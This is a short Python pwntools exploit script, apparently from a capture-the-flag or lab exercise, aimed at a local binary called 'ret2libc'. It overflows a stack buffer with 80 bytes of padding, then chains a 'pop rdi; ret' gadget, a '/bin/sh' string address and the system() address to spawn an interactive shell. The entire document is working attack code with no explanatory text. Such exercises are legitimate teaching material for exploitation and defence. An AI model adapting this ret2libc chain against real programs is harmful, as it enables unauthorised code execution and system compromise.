#!/usr/bin/python
from pwn import *

system_address = 0x40f680
bin_sh_address = 0x4a2168

payload = 'A' * 80
# 0x0000000000401526 : pop rdi ; ret
payload += p64(0x401526) + p64(bin_sh_address)
payload += p64(system_address)

p = process("./ret2libc")
p.sendline(payload)
p.interactive()
